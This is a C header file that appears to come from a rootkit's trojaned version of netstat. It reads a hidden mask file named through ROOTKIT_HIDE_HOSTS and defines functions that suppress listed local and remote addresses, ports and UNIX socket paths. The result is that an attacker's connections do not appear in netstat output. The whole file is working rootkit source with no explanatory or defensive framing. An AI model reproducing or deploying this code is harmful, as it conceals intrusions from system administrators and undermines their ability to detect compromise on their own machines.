#define STR_SIZE	128
#define SPC_CHAR	" "
#define END_CHAR	"\n"
#define SHOWFLAG	/*  Able to list all with 'netstat -/' command  */

#define BY_LADDR	1
#define BY_RADDR	2
#define BY_LPORT	3
#define BY_RPORT	4
#define BY_UNIX		5

struct  h_st {
	struct h_st     *next;
	int             hack_type;
	char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;

int	showall;

#ifdef MAIN_DOT_C
inline addr_block_list() /* HACK read in maskfile */
{
	char FILENAME[10];

	FILENAME[0]=ROOTKIT_HIDE_HOSTS[0];
	FILENAME[1]=ROOTKIT_HIDE_HOSTS[1];
	FILENAME[2]=ROOTKIT_HIDE_HOSTS[2];
	FILENAME[3]=ROOTKIT_HIDE_HOSTS[3];
	FILENAME[4]=ROOTKIT_HIDE_HOSTS[4];
	FILENAME[5]=ROOTKIT_HIDE_HOSTS[5];
	FILENAME[6]=ROOTKIT_HIDE_HOSTS[6];
	FILENAME[7]=ROOTKIT_HIDE_HOSTS[7];
	FILENAME[8]=ROOTKIT_HIDE_HOSTS[8];
	FILENAME[9]='\0';

	h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
	hack_list=h_tmp;
	if(fp_hack=fopen (FILENAME, "r")) {
		while(fgets(tmp_str, 126, fp_hack)) {
			h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
			strp=tmp_str;
			strp=strtok(strp, SPC_CHAR);
			h_tmp->hack_type=atoi(strp);
			strp=strtok('\0', END_CHAR);
			strcpy(h_tmp->hack_cmd, strp);
			h_tmp=h_tmp->next;
		}
		fclose(fp_hack);
	}

	h_tmp->next=NULL;
}
#endif

#ifdef INET_DOT_C
inline int check_inet(struct inpcb the_net)  
{
	int hide=0;

	for(h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
		switch(h_tmp->hack_type) {
			case BY_LADDR:
				if(strstr(inet_ntoa(the_net.inp_laddr),h_tmp->hack_cmd))
					hide=1;
				break;
			case BY_RADDR:
				if(strstr(inet_ntoa(the_net.inp_faddr),h_tmp->hack_cmd))
					hide=1;
				break;
			case BY_LPORT:
				if(the_net.inp_lport==atoi(h_tmp->hack_cmd)) 
					hide=1;
				break;
			case BY_RPORT:
				if(the_net.inp_fport==atoi(h_tmp->hack_cmd))
					hide=1;
				break;
		}
	} 

	return(hide);
}
#endif

#ifdef UNIX_DOT_C
inline int check_unix(char *path)
{
	int hide=0; /* ira BEGIN */
     
	for(h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
		switch(h_tmp->hack_type) {
			case BY_UNIX:
				if(strstr(path, h_tmp->hack_cmd))
					hide=1;
				break;
		}
	}
   
	return(hide);
}
#endif
